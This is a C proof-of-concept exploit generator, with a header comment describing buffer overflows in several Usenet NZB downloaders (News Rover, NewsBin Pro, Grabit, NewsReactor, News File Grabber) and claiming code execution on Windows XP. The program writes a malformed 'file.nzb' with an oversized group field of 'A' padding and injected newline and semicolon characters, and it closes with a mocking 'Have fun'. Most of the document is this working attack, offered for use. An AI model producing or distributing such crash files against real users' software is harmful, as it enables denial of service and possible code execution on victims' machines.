/*********************************************************************************************\
*                                                                            
                  *
*			                   NZB Generic 0Day DoS Exploit                          
          *
*    Proofs of Concept for News File Grabber, NewsBin, Grabit, NewsReactor 
and News Rover     *
*                                                                            
                  *
*                                                                            
                  *
* Bugs in News Rover <=12.1 Rev 1:                                           
                  *
* There's a stack overflow in RoverNZB triggered by files that contains a 
long subject.       *
* There's a stack overflow in NewsRover triggered by files that contains a 
long group.        *
* To trigger: run file.nzb                                                   
                  *
* Impact: Code execution on Windows XP, SP1 and SP2                          
                  *
*                                                                            
                  *
* Bug in News File Grabber 4.1.0.1:                                          
                  *
* If the subject field contains a new line, the app will try to exec data in 
memory. But      *
* since the address changed every time the app runs it's very hard to 
exploit. However I      *
* sometimes got EIP overwritten by my chars                                  
                  *
* To trigger: load file.nzb and start download. CPU -> 100% and then Out of 
Memory error.     *
* Impact: Code execution on Windows XP, SP1 and SP2                          
                  *
*                                                                            
                  *
* Bug in Grabit 1.5.3:                                                       
                  *
* Grabit does not correctly handle fields that contains a semicolon.         
                  *
* To trigger: Just grab the file                                             
                  *
* Impact: DoS                                                                
                  *
* Note: Grabit 1.6 is not affected.                                          
                  *
*                                                                            
                  *
* Bug in NewsReactor:                                                        
                  *
* There's a heap overflow that occurs when group field is too long.          
                  *
* To trigger: load file.nzb, click grab. After a few tries to get the file 
it crashes.        *
* Impact: Code execution on Windows XP, SP1 and DoS on SP2                   
                  *
*                                                                            
                  *
* Bug in NewsBin Pro 4.3.2:                                                  
                  *
* There's a heap overflow that occurs when group field is too long.          
                  *
* To trigger: load file.nzb, and start download. The app should then be 
unstable.             *
* Impact: Code execution on Windows XP, SP1 and DoS on SP2                   
                  *
*                                                                            
                  *
* Bug in NewsBin Pro 5.33 (maybe others...):                                 
                  *
* There's a heap overflow that occurs when group field is too long.          
                  *
* To trigger: load file.nzb, and start download. Then click "Delete All 
Posts". Boom!         *
* Impact: Code execution on Windows XP, SP1 and DoS on SP2                   
                  *
* Note: Maybe it's possible to exec code on SP2, but there is a lot of bad 
chars and with the *
* stack protection I didn't find a way to jump to a good return address.     
                  *
*                                                                            
                  *
* Solution: Buy your dvds leecha!!!                                          
                  *
*                                                                            
                  *
*                                                                            
                  *
* Coded and discovered by Marsu <MarsupilamiPowa@hotmail.fr>                 
                  *
* Note: thx aux Bananas et a la KryptonIT. Bon courage aux inuITs :P         
                  *
\*********************************************************************************************/

#include "stdlib.h"
#include "stdio.h"
#include "string.h"

char nzbheader[]="<?xml version=\"1.0\" encoding=\"iso-8859-1\" ?>\n"
				 "<!DOCTYPE nzb PUBLIC \"-//newzBin//DTD NZB 1.0//EN\" 
\"http://www.newzbin.com/DTD/nzb/nzb-1.0.dtd\">\n"
				 "<!-- NZB Generated by MarsupilamiPowa -->\n"
				 "<nzb xmlns=\"MarsupilamiPowa@hotmail.fr\">\n\n";


char nzbend[]="</segment>\n"
              "</segments>\n"
              "</file>\n"
              "</nzb>\n";



int main(int argc, char* argv[]) {

FILE *file;
char * pad;

printf("MarsupilamiPowa's Generic NZB DoS Exploit\n");

file=fopen("file.nzb","wb");

fprintf(file,nzbheader);
fprintf(file,"<file poster=\"Marsu\n");
fprintf(file,"\" date=\"1170609233\"\nsubject=\"hello bug");
fprintf(file,"\">\n");
fprintf(file,"<groups><group>");

pad = (char*)malloc(sizeof(char)*3000);
memset(pad,'A',3000);
fprintf(file,pad);
fprintf(file,"</group></groups>\n<segments>\n<segment bytes=\"30\" 
number=\"1\">");
fprintf(file,"\n;\n");
fprintf(file,nzbend);
fclose(file);

printf("file.nzb generated! Have fun\n");
return 0;

}

                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                